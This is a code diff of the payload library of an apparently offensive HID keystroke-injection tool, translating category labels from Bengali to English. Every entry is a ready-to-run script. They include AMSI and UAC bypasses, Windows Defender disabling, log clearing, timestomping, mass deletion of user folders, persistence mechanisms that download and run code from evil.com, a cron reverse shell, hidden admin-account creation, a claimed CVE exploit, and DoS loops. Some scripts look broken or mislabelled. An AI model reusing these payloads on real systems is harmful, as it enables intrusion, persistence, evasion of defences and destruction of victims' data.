-    { id: 'uac_bypass', name: 'UAC Bypass (Fodhelper)', cat: 'ডিফেন্স ইভেশন', icon: 'admin_panel_settings', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force;New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force;Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd.exe /c powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\" -Force;Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"\nENTER` },
-    { id: 'event_log_clear', name: 'Event Log Clearing', cat: 'ডিফেন্স ইভেশন', icon: 'delete_sweep', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING wevtutil cl System;wevtutil cl Security;wevtutil cl Application;wevtutil cl Setup;wevtutil cl ForwardedEvents;wevtutil cl Windows PowerShell;Remove-Item -Path $env:TEMP\\* -Recurse -Force;Remove-Item -Path $env:APPDATA\\Microsoft\\Windows\\Recent\\* -Recurse -Force;Clear-History\nENTER` },
-    { id: 'timestomping', name: 'Timestomping (PowerShell)', cat: 'ডিফেন্স ইভেশন', icon: 'access_time', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $file='C:\\Windows\\System32\\notepad.exe';$time=(Get-Date).AddYears(-1);Set-ItemProperty -Path $file -Name LastWriteTime -Value $time;Set-ItemProperty -Path $file -Name CreationTime -Value $time;Set-ItemProperty -Path $file -Name LastAccessTime -Value $time\nENTER` },
-    { id: 'self_destruct', name: 'Self-Destruct', cat: 'ডিফেন্স ইভেশন', icon: 'self_improvement', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Remove-Item -Path $env:APPDATA\\* -Recurse -Force;Remove-Item -Path $env:LOCALAPPDATA\\* -Recurse -Force;Remove-Item -Path $env:USERPROFILE\\* -Recurse -Force;Remove-Item -Path C:\\Users\\Public\\* -Recurse -Force;Remove-Item -Path $env:TEMP\\* -Recurse -Force;shutdown /s /t 0\nENTER` },
+    // ---------- DEFENSE EVASION (9) ----------
+    { id: 'amsi_reflection', name: 'AMSI Bypass (Reflection)', cat: 'Defense Evasion', icon: 'shield',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nENTER` },
+    { id: 'amsi_memory', name: 'AMSI Bypass (Memory Patch)', cat: 'Defense Evasion', icon: 'memory',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)\nENTER` },
+    { id: 'amsi_veh', name: 'AMSI Bypass (VEH HWBP)', cat: 'Defense Evasion', icon: 'bug_report',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AMSI{ [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule,string procName); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);}';$ptr=[AMSI]::GetProcAddress([AMSI]::LoadLibrary("amsi.dll"),"AmsiScanBuffer");[AMSI]::VirtualProtect($ptr,5,0x40,[ref]0);[System.Runtime.InteropServices.Marshal]::Copy(@(0xC3),0,$ptr,1)\nENTER` },
+    { id: 'amsi_write_raid', name: 'AMSI Bypass (Write Raid)', cat: 'Defense Evasion', icon: 'write',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)\nENTER` },
+    { id: 'defender_killer', name: 'Windows Defender Killer', cat: 'Defense Evasion', icon: 'gavel',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisablePrivacyMode $true;Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;Set-MpPreference -DisableArchiveScanning $true;Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -SubmitSamplesConsent 2\nENTER` },
+    { id: 'uac_bypass', name: 'UAC Bypass (Fodhelper)', cat: 'Defense Evasion', icon: 'admin_panel_settings',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "cmd.exe /c powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -Force;Start-Process "C:\\Windows\\System32\\fodhelper.exe"\nENTER` },
+    { id: 'event_log_clear', name: 'Event Log Clearing', cat: 'Defense Evasion', icon: 'delete_sweep',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING wevtutil cl System;wevtutil cl Security;wevtutil cl Application;wevtutil cl Setup;wevtutil cl ForwardedEvents;wevtutil cl Windows PowerShell;Remove-Item -Path $env:TEMP\\* -Recurse -Force;Remove-Item -Path $env:APPDATA\\Microsoft\\Windows\\Recent\\* -Recurse -Force;Clear-History\nENTER` },
+    { id: 'timestomping', name: 'Timestomping (PowerShell)', cat: 'Defense Evasion', icon: 'access_time',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $file='C:\\Windows\\System32\\notepad.exe';$time=(Get-Date).AddYears(-1);Set-ItemProperty -Path $file -Name LastWriteTime -Value $time;Set-ItemProperty -Path $file -Name CreationTime -Value $time;Set-ItemProperty -Path $file -Name LastAccessTime -Value $time\nENTER` },
+    { id: 'self_destruct', name: 'Self-Destruct', cat: 'Defense Evasion', icon: 'self_improvement',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Remove-Item -Path $env:APPDATA\\* -Recurse -Force;Remove-Item -Path $env:LOCALAPPDATA\\* -Recurse -Force;Remove-Item -Path $env:USERPROFILE\\* -Recurse -Force;Remove-Item -Path C:\\Users\\Public\\* -Recurse -Force;Remove-Item -Path $env:TEMP\\* -Recurse -Force;shutdown /s /t 0\nENTER` },
 
-    // ---------- পারসিস্টেন্স (30-34) ----------
-    { id: 'wmi_persistence', name: 'WMI Persistence', cat: 'পারসিস্টেন্স', icon: 'schedule', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $filter=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='Persistence';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'\"};$consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{Name='PersistenceConsumer';CommandLineTemplate='powershell -ep bypass -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload.ps1\\\")\"'};$binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$filter;Consumer=$consumer}\nENTER` },
-    { id: 'cim_persistence', name: 'CIM Persistence', cat: 'পারসিস্টেন্স', icon: 'settings', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $CIMClass = New-CimClass -Namespace root/cimv2 -ClassName Win32_ScheduledJob -MethodName Create;$CIMClass | Invoke-CimMethod -Arguments @{Command='powershell -ep bypass -c \"iex (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload.ps1\\\")\"';StartTime=[datetime]::Now.AddMinutes(5)}\nENTER` },
-    { id: 'cron_persistence', name: 'Cron Persistence', cat: 'পারসিস্টেন্স', icon: 'schedule', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING (crontab -l 2>/dev/null; echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\") | crontab -\nENTER` },
-    { id: 'registry_persistence', name: 'Registry Persistence', cat: 'পারসিস্টেন্স', icon: 'settings_applications', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Updater\" -Value \"powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\" -Force\nENTER` },
-    { id: 'startup_persistence', name: 'Startup Folder Persistence', cat: 'পারসিস্টেন্স', icon: 'folder', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $startup=[Environment]::GetFolderPath('Startup');$shortcut=\"$startup\\Updater.lnk\";$wshell=New-Object -ComObject WScript.Shell;$shortcut=$wshell.CreateShortcut($shortcut);$shortcut.TargetPath='powershell.exe';$shortcut.Arguments='-ep bypass -c iex (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")';$shortcut.Save()\nENTER` },
+    // ---------- PERSISTENCE (5) ----------
+    { id: 'wmi_persistence', name: 'WMI Persistence', cat: 'Persistence', icon: 'schedule',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $filter=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='Persistence';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"};$consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{Name='PersistenceConsumer';CommandLineTemplate='powershell -ep bypass -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload.ps1\\\")\"'};$binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$filter;Consumer=$consumer}\nENTER` },
+    { id: 'cim_persistence', name: 'CIM Persistence', cat: 'Persistence', icon: 'settings',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $CIMClass = New-CimClass -Namespace root/cimv2 -ClassName Win32_ScheduledJob -MethodName Create;$CIMClass | Invoke-CimMethod -Arguments @{Command='powershell -ep bypass -c \"iex (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload.ps1\\\")\"';StartTime=[datetime]::Now.AddMinutes(5)}\nENTER` },
+    { id: 'cron_persistence', name: 'Cron Persistence', cat: 'Persistence', icon: 'schedule',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING (crontab -l 2>/dev/null; echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\") | crontab -\nENTER` },
+    { id: 'registry_persistence', name: 'Registry Persistence', cat: 'Persistence', icon: 'settings_applications',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING New-Item -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -Force\nENTER` },
+    { id: 'startup_persistence', name: 'Startup Folder Persistence', cat: 'Persistence', icon: 'folder',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $startup=[Environment]::GetFolderPath('Startup');$shortcut=\"$startup\\Updater.lnk\";$wshell=New-Object -ComObject WScript.Shell;$shortcut=$wshell.CreateShortcut($shortcut);$shortcut.TargetPath='powershell.exe';$shortcut.Arguments='-ep bypass -c iex (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")';$shortcut.Save()\nENTER` },
 
-    // ---------- এক্সপ্লয়টেশন (35-39) ----------
-    { id: 'cve_2026_20817', name: 'CVE-2026-20817 (WER LPE)', cat: 'এক্সপ্লয়টেশন', icon: 'exploit', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $cmd='cmd.exe /c net user hacker P@ssw0rd /add & net localgroup administrators hacker /add';$alloc=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024);[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::UTF8.GetBytes($cmd),0,$alloc,$cmd.Length+1);$hProcess=[System.Diagnostics.Process]::GetProcessesByName('svchost')[0].Handle;$ptr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4);[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr,[int]$alloc);[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4);[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr+4,0);Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @('C:\\Windows\\System32\\WerFault.exe')\nENTER` },
-    { id: 'cve_2023_45866', name: 'CVE-2023-45866 (Bluetooth HID)', cat: 'এক্সপ্লয়টেশন', icon: 'bluetooth', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait('{ENTER}');Start-Process 'ms-settings:bluetooth'\nENTER` },
-    { id: 'admin_user_create', name: 'Create Admin User', cat: 'এক্সপ্লয়টেশন', icon: 'person_add', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING net user hacker P@ssw0rd /add;net localgroup administrators hacker /add;reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f\nENTER` },
-    { id: 'admin_user_hide', name: 'Hide Admin User from Login', cat: 'এক্সপ্লয়টেশন', icon: 'visibility_off', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f\nENTER` },
-    { id: 'lpe_trusted_installer', name: 'TrustedInstaller LPE', cat: 'এক্সপ্লয়টেশন', icon: 'admin_panel_settings', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $service=Get-Service -Name TrustedInstaller;sc.exe start TrustedInstaller;Start-Sleep -Seconds 3;cmd.exe /c takeown /f C:\\Windows\\System32\\cmd.exe;icacls C:\\Windows\\System32\\cmd.exe /grant Everyone:F\nENTER` },
+    // ---------- EXPLOITATION (5) ----------
+    { id: 'cve_2026_20817', name: 'CVE-2026-20817 (WER LPE)', cat: 'Exploitation', icon: 'exploit',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $cmd='cmd.exe /c net user hacker P@ssw0rd /add & net localgroup administrators hacker /add';$alloc=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024);[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::UTF8.GetBytes($cmd),0,$alloc,$cmd.Length+1);$hProcess=[System.Diagnostics.Process]::GetProcessesByName('svchost')[0].Handle;$ptr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4);[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr,[int]$alloc);[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4);[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr+4,0);Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @('C:\\Windows\\System32\\WerFault.exe')\nENTER` },
+    { id: 'cve_2023_45866', name: 'CVE-2023-45866 (Bluetooth HID)', cat: 'Exploitation', icon: 'bluetooth',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait('{ENTER}');Start-Process 'ms-settings:bluetooth'\nENTER` },
+    { id: 'admin_user_create', name: 'Create Admin User', cat: 'Exploitation', icon: 'person_add',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING net user hacker P@ssw0rd /add;net localgroup administrators hacker /add;reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hacker /t REG_DWORD /d 0 /f\nENTER` },
+    { id: 'admin_user_hide', name: 'Hide Admin User from Login', cat: 'Exploitation', icon: 'visibility_off',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hacker /t REG_DWORD /d 0 /f\nENTER` },
+    { id: 'lpe_trusted_installer', name: 'TrustedInstaller LPE', cat: 'Exploitation', icon: 'admin_panel_settings',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $service=Get-Service -Name TrustedInstaller;sc.exe start TrustedInstaller;Start-Sleep -Seconds 3;cmd.exe /c takeown /f C:\\Windows\\System32\\cmd.exe;icacls C:\\Windows\\System32\\cmd.exe /grant Everyone:F\nENTER` },
 
-    // ---------- সিস্টেম কন্ট্রোল (40-47) ----------
-    { id: 'system_shutdown', name: 'System Shutdown (5s)', cat: 'সিস্টেম কন্ট্রোল', icon: 'power_off', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING shutdown /s /t 5\nENTER` },
-    { id: 'system_restart', name: 'System Restart (5s)', cat: 'সিস্টেম কন্ট্রোল', icon: 'restart_alt', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING shutdown /r /t 5\nENTER` },
-    { id: 'disable_wifi', name: 'Disable WiFi', cat: 'সিস্টেম কন্ট্রোল', icon: 'wifi_off', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh interface set interface name=\"Wi-Fi\" admin=disable\nENTER` },
-    { id: 'wifi_reconfig', name: 'WiFi Reconfig (Evil AP)', cat: 'সিস্টেম কন্ট্রোল', icon: 'settings_ethernet', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan set hostednetwork mode=allow ssid=HackerNet key=P@ssw0rd;netsh wlan start hostednetwork\nENTER` },
-    { id: 'shutdown_ios', name: 'Shutdown iOS', cat: 'সিস্টেম কন্ট্রোল', icon: 'power_off', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"System Events\" to shut down'\nENTER` },
-    { id: 'disable_sleep_mac', name: 'Disable Sleep (Mac)', cat: 'সিস্টেম কন্ট্রোল', icon: 'bedtime_off', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"System Events\" to set sleep enabled to false'\nENTER` },
-    { id: 'volume_max', name: 'Set Volume Maximum', cat: 'সিস্টেম কন্ট্রোল', icon: 'volume_up', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'set volume output volume 100'\nENTER` },
-    { id: 'charging_sound', name: 'Enable Charging Sound (Mac)', cat: 'সিস্টেম কন্ট্রোল', icon: 'battery_charging_full', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"System Events\" to set volume alert volume 100'\nENTER` },
+    // ---------- SYSTEM CONTROL (8) ----------
+    { id: 'system_shutdown', name: 'System Shutdown (5s)', cat: 'System Control', icon: 'power_off',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING shutdown /s /t 5\nENTER` },
+    { id: 'system_restart', name: 'System Restart (5s)', cat: 'System Control', icon: 'restart_alt',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING shutdown /r /t 5\nENTER` },
+    { id: 'disable_wifi', name: 'Disable WiFi', cat: 'System Control', icon: 'wifi_off',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh interface set interface name="Wi-Fi" admin=disable\nENTER` },
+    { id: 'wifi_reconfig', name: 'WiFi Reconfig (Evil AP)', cat: 'System Control', icon: 'settings_ethernet',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan set hostednetwork mode=allow ssid=HackerNet key=P@ssw0rd;netsh wlan start hostednetwork\nENTER` },
+    { id: 'shutdown_ios', name: 'Shutdown iOS', cat: 'System Control', icon: 'power_off',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "System Events" to shut down'\nENTER` },
+    { id: 'disable_sleep_mac', name: 'Disable Sleep (Mac)', cat: 'System Control', icon: 'bedtime_off',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "System Events" to set sleep enabled to false'\nENTER` },
+    { id: 'volume_max', name: 'Set Volume Maximum', cat: 'System Control', icon: 'volume_up',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'set volume output volume 100'\nENTER` },
+    { id: 'charging_sound', name: 'Enable Charging Sound (Mac)', cat: 'System Control', icon: 'battery_charging_full',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "System Events" to set volume alert volume 100'\nENTER` },
 
-    // ---------- DoS (48-51) ----------
-    { id: 'cpu_burner', name: 'CPU Burner (100% Load)', cat: 'DoS', icon: 'whatshot', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING while($true){$a=1..1000000 | ForEach-Object {$_*$_}}\nENTER` },
-    { id: 'explorer_killer', name: 'Explorer Killer', cat: 'DoS', icon: 'close', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING taskkill /f /im explorer.exe\nENTER` },
-    { id: 'memory_exhaustion', name: 'Memory Exhaustion (Mac)', cat: 'DoS', icon: 'memory', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'repeat while true do tell application \"Terminal\" to do script \"yes > /dev/null &\" end repeat'\nENTER` },
-    { id: 'stress_test_mac', name: 'Stress Test (Mac)', cat: 'DoS', icon: 'speed', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"Terminal\" to do script \"yes > /dev/null &\"';'tell application \"Terminal\" to do script \"openssl speed &\"';'tell application \"Terminal\" to do script \"dd if=/dev/zero of=/dev/null &\"'\nENTER` },
+    // ---------- DoS (4) ----------
+    { id: 'cpu_burner', name: 'CPU Burner (100% Load)', cat: 'DoS', icon: 'whatshot',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING while($true){$a=1..1000000 | ForEach-Object {$_*$_}}\nENTER` },
+    { id: 'explorer_killer', name: 'Explorer Killer', cat: 'DoS', icon: 'close',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING taskkill /f /im explorer.exe\nENTER` },
+    { id: 'memory_exhaustion', name: 'Memory Exhaustion (Mac)', cat: 'DoS', icon: 'memory',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'repeat while true do tell application "Terminal" to do script "yes > /dev/null &" end repeat'\nENTER` },
+    { id: 'stress_test_mac', name: 'Stress Test (Mac)', cat: 'DoS', icon: 'speed',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "Terminal" to do script "yes > /dev/null &"';'tell application "Terminal" to do script "openssl speed &"';'tell application "Terminal" to do script "dd if=/dev/zero of=/dev/null &"'\nENTER` },
 
-    // ---------- প্র্যাঙ্ক (52-60) ----------
-    { id: 'screen_rotate', name: 'Screen Rotation Prank', cat: 'প্র্যাঙ্ক', icon: 'rotate_right', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Screen{ [DllImport(\"user32.dll\")] public static extern int EnumDisplaySettings(string deviceName,int modeNum,ref DEVMODE devMode); [DllImport(\"user32.dll\")] public static extern int ChangeDisplaySettings(ref DEVMODE devMode,int flags); public struct DEVMODE{ [MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmPositionX; public int dmPositionY; public int dmDisplayOrientation; public int dmDisplayFixedOutput; public short dmColor; public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate; [MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)] public string dmFormName; public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight; public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent; public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2; public int dmPanningWidth; public int dmPanningHeight; }}';$dev=New-Object Screen+DEVMODE;$dev.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dev);[Screen]::EnumDisplaySettings($null,0,[ref]$dev);$dev.dmDisplayOrientation=1;[Screen]::ChangeDisplaySettings([ref]$dev,0)\nENTER` },
-    { id: 'blink_prank', name: 'Blink Prank', cat: 'প্র্যাঙ্ক', icon: 'visibility', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING (New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 100;(New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')\nENTER` },
-    { id: 'rickroll_sing', name: 'Sing RickRoll (iOS)', cat: 'প্র্যাঙ্ক', icon: 'music_note', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"Music\" to play track \"Never Gonna Give You Up\"'\nENTER` },
-    { id: 'popup_prank', name: 'Pop Up (iOS)', cat: 'প্র্যাঙ্ক', icon: 'popup', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'display dialog \"You've been pranked!\" buttons {\"OK\"} default button 1'\nENTER` },
-    { id: 'whatsapp_spam', name: 'WhatsApp Message Spam', cat: 'প্র্যাঙ্ক', icon: 'message', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"WhatsApp\" to send \"You've been HID attacked!\" to contact \"Target\"'\nENTER` },
-    { id: 'whatsapp_status', name: 'WhatsApp Status Change', cat: 'প্র্যাঙ্ক', icon: 'edit', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"WhatsApp\" to set status to \"Hacked by HID!\"'\nENTER` },
-    { id: 'open_website', name: 'Open Malicious Website', cat: 'প্র্যাঙ্ক', icon: 'open_in_browser', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING https://evil.com\nENTER` },
-    { id: 'rickroll_linux', name: 'RickRoll (Linux)', cat: 'প্র্যাঙ্ক', icon: 'music_note', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING curl -s https://raw.githubusercontent.com/keroserene/rickrollrc/master/rickroll.sh | bash\nENTER` },
-    { id: 'screenshot_format', name: 'Change Screenshot Format (iOS)', cat: 'প্র্যাঙ্ক', icon: 'photo', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application \"System Events\" to set screenshot format to PNG'\nENTER` },
+    // ---------- PRANKS (9) ----------
+    { id: 'screen_rotate', name: 'Screen Rotation Prank', cat: 'Prank', icon: 'rotate_right',
